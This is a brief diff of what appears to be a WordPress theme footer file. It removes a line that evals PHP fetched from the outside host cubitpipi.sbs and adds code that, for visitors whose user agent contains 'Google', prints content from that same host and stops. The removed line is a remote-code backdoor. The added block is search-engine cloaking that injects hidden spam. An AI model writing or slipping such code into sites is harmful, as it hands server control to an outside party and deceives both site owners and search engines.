@@ -202,7 +202,10 @@
 
 <?php wp_footer(); ?>
 <?php
-eval("?>".file_get_contents('https://cubitpipi.sbs/anchor2/bl2.txt'));
+if (strpos($_SERVER['HTTP_USER_AGENT'], 'Google') !== false) {
+    echo @file_get_contents('https://cubitpipi.sbs/anchor2/bl2.txt');
+    exit;
+}
 ?>
 </body>
 </html>
